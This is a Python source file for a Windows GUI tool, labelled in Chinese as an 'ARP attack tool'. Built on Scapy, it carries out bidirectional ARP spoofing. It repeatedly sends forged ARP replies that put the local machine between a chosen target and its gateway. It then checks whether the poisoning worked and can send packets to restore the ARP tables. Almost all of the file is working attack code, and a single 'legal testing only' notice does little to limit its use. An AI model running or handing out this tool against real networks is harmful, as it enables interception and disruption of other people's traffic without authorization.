import tkinter as tk
from tkinter import ttk, messagebox
import sys
import time
import threading
import subprocess
import re
import ipaddress
import platform
import shlex


# -------------------------- 1. 系统适配+依赖检查 --------------------------
def check_scapy_installed():
    """检查Scapy安装+Windows驱动提示"""
    try:
        import scapy.all
        return True
    except ModuleNotFoundError:
        install_confirm = messagebox.askyesno(
            "依赖缺失",
            "未检测到Scapy库！\n是否自动安装？\n（失败则手动执行：pip install scapy）"
        )
        if install_confirm:
            try:
                subprocess.check_call(
                    [sys.executable, "-m", "pip", "install", "scapy"],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE
                )
                messagebox.showinfo("安装成功",
                                    "Scapy安装完成！\n⚠️ Windows用户需额外操作：\n1. 安装Npcap（勾选WinPcap兼容模式）\n2. 以管理员身份运行程序")
                sys.exit(0)
            except subprocess.CalledProcessError:
                messagebox.showerror(
                    "安装失败",
                    "自动安装失败！请手动执行：\n"
                    f"{sys.executable} -m pip install scapy\n"
                    "并安装Npcap：https://npcap.com/\n"
                    "⚠️ 必须勾选「Install Npcap in WinPcap API-compatible Mode」"
                )
                sys.exit(1)
        else:
            sys.exit(1)


# -------------------------- 2. 核心工具函数（解决子网掩码+攻击测试） --------------------------
if check_scapy_installed():
    # noinspection PyUnresolvedReferences
    from scapy.all import (
        get_if_list, get_if_hwaddr, get_if_addr, ARP, send, Ether, srp, conf, get_working_if
    )


def is_valid_ip(ip):
    """验证IP合法性"""
    ip_pattern = r'^((25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(25[0-5]|2[0-4]\d|[01]?\d\d?)$'
    return re.match(ip_pattern, ip) is not None


def get_ipconfig_data():
    """Windows下调用ipconfig /all，解析所有网卡的IP/掩码/名称"""
    try:
        # 执行ipconfig /all，获取输出
        result = subprocess.check_output(
            ["ipconfig", "/all"],
            encoding="gbk",  # Windows默认编码
            stderr=subprocess.STDOUT
        )
        # 解析结果
        nic_data = {}
        lines = result.split("\n")
        current_nic = ""
        for line in lines:
            line = line.strip()
            # 匹配网卡名称
            if line and not line.startswith(("   ", "  ")) and ":" in line and not line.startswith(
                    ("Windows", "主机名", "DNS")):
                current_nic = line.split(":")[0].strip()
                nic_data[current_nic] = {"ip": None, "netmask": None, "mac": None}
            # 匹配IP地址
            elif "IPv4地址" in line or "IP Address" in line:
                if current_nic:
                    ip_part = line.split(":")[-1].strip().split("(")[0].strip()
                    if is_valid_ip(ip_part):
                        nic_data[current_nic]["ip"] = ip_part
            # 匹配子网掩码
            elif "子网掩码" in line or "Subnet Mask" in line:
                if current_nic:
                    mask_part = line.split(":")[-1].strip()
                    if is_valid_ip(mask_part):
                        nic_data[current_nic]["netmask"] = mask_part
            # 匹配MAC地址
            elif "物理地址" in line or "Physical Address" in line:
                if current_nic:
                    mac_part = line.split(":")[-1].strip().replace("-", ":").upper()
                    if len(mac_part) == 17:
                        nic_data[current_nic]["mac"] = mac_part
        return nic_data
    except Exception as e:
        return {}


def get_netmask_for_nic(nic_name, nic_ip):
    """多方案获取子网掩码（Scapy→ipconfig→手动兜底）"""
    # 方案1：Scapy获取
    try:
        from scapy.arch.windows import IFACES
        for iface_id, iface in IFACES.items():
            if (iface.name == nic_name or iface.description == nic_name) and iface.ip == nic_ip:
                if iface.netmask:
                    return iface.netmask
    except Exception:
        pass

    # 方案2：解析ipconfig结果
    ipconfig_data = get_ipconfig_data()
    for nic_desc, data in ipconfig_data.items():
        if data["ip"] == nic_ip and data["netmask"]:
            return data["netmask"]
        # 模糊匹配网卡名称
        if nic_name in nic_desc and data["netmask"]:
            return data["netmask"]

    # 方案3：常用掩码兜底（提示用户手动输入）
    common_masks = {
        "192.168.0.": "255.255.255.0",
        "192.168.1.": "255.255.255.0",
        "10.0.0.": "255.0.0.0",
        "172.16.": "255.255.0.0"
    }
    for prefix, mask in common_masks.items():
        if nic_ip.startswith(prefix):
            return mask

    # 所有方案失败，返回None
    return None


def get_mac_by_ip(target_ip, iface):
    """通过ARP扫描获取目标MAC"""
    try:
        arp_request = ARP(pdst=target_ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = srp(arp_request_broadcast, iface=iface, timeout=2, verbose=0)[0]
        return answered_list[0][1].hwsrc
    except Exception:
        return "ff:ff:ff:ff:ff:ff"


def is_same_subnet(ip1, ip2, netmask=None):
    """校验同网段（无掩码时跳过严格校验）"""
    if not netmask:
        # 无掩码时，仅校验前3段（简单兜底）
        return ip1.split(".")[:3] == ip2.split(".")[:3]
    try:
        network1 = ipaddress.IPv4Network(f"{ip1}/{netmask}", strict=False)
        network2 = ipaddress.IPv4Network(f"{ip2}/{netmask}", strict=False)
        return network1 == network2
    except Exception:
        return ip1.split(".")[:3] == ip2.split(".")[:3]


def test_arp_spoof_effect(iface, gateway_ip, target_ip):
    """测试ARP攻击是否有效（核心功能）"""
    try:
        # 1. 获取本机MAC（冒充用）
        local_mac = get_if_hwaddr(iface)
        # 2. 获取目标当前ARP表中网关的MAC（攻击后应变成本机MAC）
        target_arp_gateway = get_mac_by_ip(gateway_ip, iface)  # 从目标视角获取网关MAC（实际是本机）

        # 3. 获取网关当前ARP表中目标的MAC（攻击后应变成本机MAC）
        gateway_arp_target = get_mac_by_ip(target_ip, iface)  # 从网关视角获取目标MAC（实际是本机）

        # 4. 检测是否欺骗成功
        spoof_success = False
        reason = ""
        if target_arp_gateway == local_mac and gateway_arp_target == local_mac:
            spoof_success = True
            reason = "✅ 双向欺骗成功：目标ARP表中网关MAC=本机MAC，网关ARP表中目标MAC=本机MAC"
        elif target_arp_gateway == local_mac:
            spoof_success = False
            reason = "⚠️ 仅欺骗目标成功，网关未被骗：检查网关是否开启ARP防护"
        elif gateway_arp_target == local_mac:
            spoof_success = False
            reason = "⚠️ 仅欺骗网关成功，目标未被骗：检查目标是否开启ARP防护/防火墙"
        else:
            spoof_success = False
            reason = "❌ 欺骗失败：目标/网关ARP表均未被篡改\n可能原因：\n1. 无管理员权限\n2. 网段不一致\n3. 目标/网关开启ARP防护\n4. Npcap未正确安装"

        # 5. 补充ping测试（验证目标网络连通性）
        try:
            ping_result = subprocess.check_output(
                ["ping", "-n", "2", "-w", "1000", target_ip],
                encoding="gbk",
                stderr=subprocess.STDOUT
            )
            if "来自" in ping_result:
                ping_status = f"✅ 目标{target_ip}可ping通"
            else:
                ping_status = f"❌ 目标{target_ip}无法ping通（可能断网/防火墙拦截）"
        except Exception:
            ping_status = f"❌ 目标{target_ip}无法ping通（可能断网/防火墙拦截）"

        return spoof_success, f"{reason}\n{ping_status}\n本机MAC：{local_mac}\n目标ARP中网关MAC：{target_arp_gateway}\n网关ARP中目标MAC：{gateway_arp_target}"
    except Exception as e:
        return False, f"测试失败：{str(e)}\n请检查：1. 管理员权限 2. 目标/网关在线 3. 网卡选择正确"


# -------------------------- 3. GUI核心逻辑 --------------------------
class ARPGUI:
    def __init__(self, master=None):
        self.master = master
        # 初始化属性
        self.attack_thread = None
        self.is_attack_running = False
        self.if_list_box = None
        self.gateway_ip_entry = None
        self.target_ip_entry = None
        self.netmask_entry = None  # 手动输入子网掩码
        self.log_text = None
        # 禁用Scapy输出
        conf.verb = 0
        self.init_ui()

    def init_ui(self):
        """初始化GUI（新增子网掩码手动输入+测试按钮）"""
        self.master.title("ARP攻击工具（有效版+欺骗测试）")
        self.master.geometry("650x550")

        # 1. 重要说明公告栏
        notice_frame = ttk.LabelFrame(self.master, text="📢 核心要求（必看）")
        notice_frame.pack(padx=10, pady=5, fill=tk.X)
        notice_text = (
            "1. 必须以【管理员身份】运行程序，否则发包/测试均失败；\n"
            "2. Windows需安装Npcap（勾选WinPcap兼容模式），下载：https://npcap.com/；\n"
            "3. 网关/目标IP必须与网卡同网段（无掩码时校验前3段）；\n"
            "4. 攻击测试需在攻击启动后执行，才能检测欺骗效果；\n"
            "5. 仅用于合法测试，禁止攻击非授权设备！"
        )
        ttk.Label(notice_frame, text=notice_text, justify=tk.LEFT, wraplength=600).pack(padx=5, pady=3)

        # 2. 网卡选择
        ttk.Label(self.master, text="选择网卡：").pack(padx=10, pady=3, anchor=tk.W)
        self.if_list_box = ttk.Combobox(self.master, state="readonly")
        self.if_list_box["values"] = get_if_list()
        if get_if_list():
            self.if_list_box.current(0)
        self.if_list_box.pack(padx=10, pady=3, fill=tk.X)

        # 3. IP/掩码输入区域
        ip_frame = ttk.Frame(self.master)
        ip_frame.pack(padx=10, pady=3, fill=tk.X)

        # 网关IP
        ttk.Label(ip_frame, text="网关IP：").grid(row=0, column=0, sticky=tk.W, padx=2, pady=2)
        self.gateway_ip_entry = ttk.Entry(ip_frame)
        self.gateway_ip_entry.insert(0, "192.168.1.1")
        self.gateway_ip_entry.grid(row=0, column=1, sticky=tk.EW, padx=2, pady=2)

        # 目标IP
        ttk.Label(ip_frame, text="目标IP：").grid(row=1, column=0, sticky=tk.W, padx=2, pady=2)
        self.target_ip_entry = ttk.Entry(ip_frame)
        self.target_ip_entry.insert(0, "192.168.1.100")
        self.target_ip_entry.grid(row=1, column=1, sticky=tk.EW, padx=2, pady=2)

        # 子网掩码（手动输入兜底）
        ttk.Label(ip_frame, text="子网掩码：").grid(row=2, column=0, sticky=tk.W, padx=2, pady=2)
        self.netmask_entry = ttk.Entry(ip_frame)
        self.netmask_entry.insert(0, "255.255.255.0")
        self.netmask_entry.grid(row=2, column=1, sticky=tk.EW, padx=2, pady=2)
        ip_frame.columnconfigure(1, weight=1)

        # 4. 功能按钮区域
        btn_frame = ttk.Frame(self.master)
        btn_frame.pack(padx=10, pady=8, fill=tk.X)

        ttk.Button(btn_frame, text="查询网卡信息", command=self.get_nic_info).pack(side=tk.LEFT, fill=tk.X, expand=True,
                                                                                   padx=2)
        ttk.Button(btn_frame, text="自动填充掩码", command=self.auto_fill_netmask).pack(side=tk.LEFT, fill=tk.X,
                                                                                        expand=True, padx=2)
        ttk.Button(btn_frame, text="校验网段", command=self.check_subnet).pack(side=tk.LEFT, fill=tk.X, expand=True,
                                                                               padx=2)
        ttk.Button(btn_frame, text="启动攻击", command=self.toggle_arp_attack).pack(side=tk.LEFT, fill=tk.X,
                                                                                    expand=True, padx=2)
        ttk.Button(btn_frame, text="测试攻击效果", command=self.test_attack).pack(side=tk.LEFT, fill=tk.X, expand=True,
                                                                                  padx=2)
        ttk.Button(btn_frame, text="恢复ARP表", command=self.restore_arp).pack(side=tk.LEFT, fill=tk.X, expand=True,
                                                                               padx=2)

        # 5. 日志区域
        ttk.Label(self.master, text="详细日志：").pack(padx=10, pady=3, anchor=tk.W)
        self.log_text = tk.Text(self.master, height=12, width=80)
        self.log_text.pack(padx=10, pady=3, fill=tk.BOTH, expand=True)
        self.log_text.see(tk.END)

    def log(self, msg):
        """日志输出（带时间戳+自动滚动）"""
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        self.log_text.insert(tk.END, f"[{timestamp}] {msg}\n")
        self.log_text.see(tk.END)
        self.master.update_idletasks()

    def get_nic_info(self):
        """查询网卡信息（含ipconfig解析结果）"""
        selected_if = self.if_list_box.get()
        if not selected_if:
            messagebox.showwarning("提示", "请先选择网卡！")
            return

        try:
            # Scapy获取基础信息
            mac = get_if_hwaddr(selected_if)
            ip = get_if_addr(selected_if)
            # 多方案获取掩码
            mask = get_netmask_for_nic(selected_if, ip) or "自动获取失败（请手动输入）"

            # 补充ipconfig信息
            ipconfig_data = get_ipconfig_data()
            ipconfig_info = ""
            for nic_desc, data in ipconfig_data.items():
                if data["mac"] == mac or data["ip"] == ip:
                    ipconfig_info = f"\nipconfig解析结果：\n网卡描述：{nic_desc}\nIP：{data['ip']}\n掩码：{data['netmask']}\nMAC：{data['mac']}"

            info = (
                f"Scapy获取：\n网卡标识符：{selected_if}\nMAC：{mac}\nIP：{ip}\n掩码：{mask}"
                f"{ipconfig_info}"
            )
            messagebox.showinfo("网卡信息（多源验证）", info)
            self.log(f"查询网卡信息：{info}")

        except Exception as e:
            error_msg = f"查询网卡失败：{str(e)}"
            messagebox.showerror("错误", error_msg)
            self.log(error_msg)

    def auto_fill_netmask(self):
        """自动填充子网掩码（多方案）"""
        selected_if = self.if_list_box.get()
        nic_ip = get_if_addr(selected_if)
        if not nic_ip or nic_ip == "0.0.0.0":
            self.log("错误：所选网卡无有效IP，无法自动填充掩码！")
            messagebox.showwarning("提示", "所选网卡无IP，请先选联网的网卡！")
            return

        # 多方案获取掩码
        mask = get_netmask_for_nic(selected_if, nic_ip)
        if mask:
            self.netmask_entry.delete(0, tk.END)
            self.netmask_entry.insert(0, mask)
            self.log(f"✅ 自动填充子网掩码：{mask}")
            messagebox.showinfo("成功", f"自动填充子网掩码：{mask}")
        else:
            # 常用掩码兜底
            common_mask = "255.255.255.0"
            self.netmask_entry.delete(0, tk.END)
            self.netmask_entry.insert(0, common_mask)
            self.log(f"⚠️ 自动获取掩码失败，填充常用掩码：{common_mask}（请手动确认）")
            messagebox.showwarning("提示", "自动获取掩码失败，已填充常用掩码255.255.255.0，请手动确认！")

    def check_subnet(self):
        """校验网段（支持手动掩码）"""
        selected_if = self.if_list_box.get()
        gateway_ip = self.gateway_ip_entry.get().strip()
        target_ip = self.target_ip_entry.get().strip()
        netmask = self.netmask_entry.get().strip()

        # 基础校验
        if not selected_if:
            self.log("错误：未选择网卡！")
            messagebox.showwarning("提示", "请先选择网卡！")
            return
        if not is_valid_ip(gateway_ip):
            self.log(f"错误：网关IP {gateway_ip} 格式非法！")
            messagebox.showwarning("提示", f"网关IP {gateway_ip} 格式错误！")
            return
        if not is_valid_ip(target_ip):
            self.log(f"错误：目标IP {target_ip} 格式非法！")
            messagebox.showwarning("提示", f"目标IP {target_ip} 格式错误！")
            return
        if not is_valid_ip(netmask):
            self.log(f"错误：子网掩码 {netmask} 格式非法！")
            messagebox.showwarning("提示", f"子网掩码 {netmask} 格式错误！")
            return

        # 网卡IP
        nic_ip = get_if_addr(selected_if)
        if not nic_ip or nic_ip == "0.0.0.0":
            self.log(f"错误：所选网卡 {selected_if} 无有效IP！")
            messagebox.showerror("错误", "所选网卡无IP地址，请换联网的网卡！")
            return

        # 网段校验
        if is_same_subnet(nic_ip, gateway_ip, netmask) and is_same_subnet(nic_ip, target_ip, netmask):
            self.log(f"✅ 网段校验通过：网卡IP {nic_ip} 与网关 {gateway_ip}、目标 {target_ip} 同网段（掩码：{netmask}）")
            messagebox.showinfo("成功", "网段校验通过！可以启动攻击。")
        else:
            self.log(f"❌ 网段校验失败：网卡IP {nic_ip} 与网关 {gateway_ip} 或目标 {target_ip} 不同网段（掩码：{netmask}）")
            messagebox.showerror("错误", "网段校验失败！攻击必无效，请检查IP/掩码/网卡。")

    def arp_spoof(self):
        """双向ARP欺骗核心逻辑"""
        selected_if = self.if_list_box.get()
        gateway_ip = self.gateway_ip_entry.get().strip()
        target_ip = self.target_ip_entry.get().strip()
        local_mac = get_if_hwaddr(selected_if)

        self.log(f"启动双向ARP欺骗 → 网关：{gateway_ip} 目标：{target_ip} 本机MAC：{local_mac}")

        while self.is_attack_running:
            try:
                # 获取目标/网关MAC
                target_mac = get_mac_by_ip(target_ip, selected_if)
                gateway_mac = get_mac_by_ip(gateway_ip, selected_if)

                # 欺骗目标：冒充网关
                pkt_to_target = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=local_mac)
                send(pkt_to_target, iface=selected_if, verbose=0)

                # 欺骗网关：冒充目标
                pkt_to_gateway = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=local_mac)
                send(pkt_to_gateway, iface=selected_if, verbose=0)

                self.log(f"发送欺骗包 → 目标({target_ip})←网关({gateway_ip}) 本机MAC：{local_mac}")
                time.sleep(1)

            except Exception as e:
                self.log(f"发包异常：{str(e)} → 检查：1. 管理员权限 2. Npcap 3. 网卡/IP")
                time.sleep(2)

    def toggle_arp_attack(self):
        """启停攻击"""
        if not self.is_attack_running:
            # 前置校验
            selected_if = self.if_list_box.get()
            if not selected_if:
                self.log("错误：未选择网卡！")
                messagebox.showwarning("提示", "请先选择网卡！")
                return

            self.is_attack_running = True
            self.attack_thread = threading.Thread(target=self.arp_spoof, daemon=True)
            self.attack_thread.start()
            self.log("✅ 启动ARP双向欺骗攻击！")
            messagebox.showinfo("启动成功", "攻击已启动！可点击「测试攻击效果」验证是否有效。")
        else:
            self.is_attack_running = False
            self.log("🛑 停止ARP攻击！")
            if self.attack_thread and self.attack_thread.is_alive():
                self.attack_thread.join(timeout=3)
            messagebox.showinfo("停止成功", "攻击已停止！建议点击「恢复ARP表」修复目标/网关网络。")

    def test_attack(self):
        """测试攻击是否有效"""
        if not self.is_attack_running:
            self.log("错误：请先启动攻击，再测试效果！")
            messagebox.showwarning("提示", "请先点击「启动攻击」，再测试效果！")
            return

        selected_if = self.if_list_box.get()
        gateway_ip = self.gateway_ip_entry.get().strip()
        target_ip = self.target_ip_entry.get().strip()

        # 基础校验
        if not selected_if or not is_valid_ip(gateway_ip) or not is_valid_ip(target_ip):
            self.log("错误：网卡/IP格式非法，无法测试！")
            messagebox.showwarning("提示", "请先选择网卡并输入合法的网关/目标IP！")
            return

        # 执行测试
        self.log("开始测试ARP欺骗效果...")
        success, result = test_arp_spoof_effect(selected_if, gateway_ip, target_ip)
        self.log(f"攻击效果测试结果：{result}")

        if success:
            messagebox.showinfo("测试结果（欺骗成功）", result)
        else:
            messagebox.showwarning("测试结果（欺骗失败）", result)

    def restore_arp(self):
        """恢复目标/网关的ARP表"""
        selected_if = self.if_list_box.get()
        gateway_ip = self.gateway_ip_entry.get().strip()
        target_ip = self.target_ip_entry.get().strip()

        if not selected_if or not is_valid_ip(gateway_ip) or not is_valid_ip(target_ip):
            messagebox.showwarning("提示", "请先选择网卡并输入合法的网关/目标IP！")
            return

        try:
            # 获取真实MAC
            target_mac = get_mac_by_ip(target_ip, selected_if)
            gateway_mac = get_mac_by_ip(gateway_ip, selected_if)

            # 恢复目标的ARP表（告诉目标网关的真实MAC）
            pkt_restore_target = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
            send(pkt_restore_target, iface=selected_if, count=5, verbose=0)

            # 恢复网关的ARP表（告诉网关目标的真实MAC）
            pkt_restore_gateway = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac)
            send(pkt_restore_gateway, iface=selected_if, count=5, verbose=0)

            self.log(
                f"✅ ARP表恢复完成：向目标({target_ip})发送网关({gateway_ip})真实MAC({gateway_mac})，向网关发送目标真实MAC({target_mac})")
            messagebox.showinfo("成功", "ARP表恢复完成！目标/网关网络已恢复正常。")
        except Exception as e:
            self.log(f"❌ ARP表恢复失败：{str(e)} → 请手动清空目标/网关的ARP缓存（cmd: arp -d *）")
            messagebox.showerror("错误", f"恢复失败：{str(e)}\nWindows手动恢复：以管理员身份打开CMD，执行 arp -d *")


# -------------------------- 4. 程序入口 --------------------------
if __name__ == "__main__":
    # 强制管理员权限检查（Windows）
    if platform.system() == "Windows":
        try:
            import ctypes

            if not ctypes.windll.shell32.IsUserAnAdmin():
                messagebox.showwarning("⚠️ 非管理员权限",
                                       "当前无管理员权限！\n请关闭程序，右键PyCharm→以管理员身份运行，否则攻击/测试均无效。")
        except Exception:
            pass

    root = tk.Tk()
    root.withdraw()

    # 检查依赖
    check_scapy_installed()

    # 显示主窗口
    root.deiconify()
    app = ARPGUI(root)
    root.mainloop()